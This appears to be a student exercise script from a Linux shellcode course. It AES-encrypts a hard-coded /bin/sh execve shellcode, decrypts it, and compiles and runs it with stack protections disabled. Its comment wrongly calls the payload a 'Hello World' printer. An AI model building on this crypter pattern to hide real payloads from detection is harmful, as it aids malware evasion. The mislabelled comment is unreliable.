#!/usr/bin/env python

from Crypto import Random
from Crypto.Cipher import AES
import os 

class Encryptor:

    def __init__(self, key):
        self.key = key

    def pad(self, s):
        return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

    def encrypt(self, message, key, key_size=256):
        message = self.pad(message)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(message)

    def decrypt(self, ciphertext, key):
        iv = ciphertext[:AES.block_size]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
        return plaintext.rstrip(b"\0")

def toHex(s):
    lst = []
    for ch in s:
        hv = hex(ord(ch)).replace('0x', '')
        if len(hv) == 1:
            hv = '0'+hv
        lst.append('\\x'+hv)

    return reduce(lambda x,y:x+y, lst)

def ShellcodeExecute(filename, stringSearch):

	# Open Shellcode.c file and change the shellcode to the decrypted one here.
	s = open(filename).read()
	s = s.replace(stringSearch, toHex(test))
	f = open(filename, 'w')
	f.write(s)
	f.close()

	# Compile Shellcode.c and execute it.
	os.system("gcc -fno-stack-protector -z execstack " + filename + " -o " + filename[:-2])
	os.system("./original_shellcode")



# Key: 'slaestudent02018' 73 6c 61 65 .. 73 74 75 64 .. 65 6e 74 30 .. 32 30 31 38
key = "\x73\x6c\x61\x65\x73\x74\x75\x64\x65\x6e\x74\x30\x32\x30\x31\x38"
enc = Encryptor(key)

# Shellcode to be encrypted, print 'Hello World!'
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

ci = enc.encrypt(shellcode, key)
print "\nEncrypted: \n\n%s\n" %toHex(ci)

test = enc.decrypt(ci, key)
print "Original: \n\n%s\n\n" %toHex(test)

print "Execute Shellcode Now .. \n"
ShellcodeExecute("original_shellcode.c", "Replace_Me")

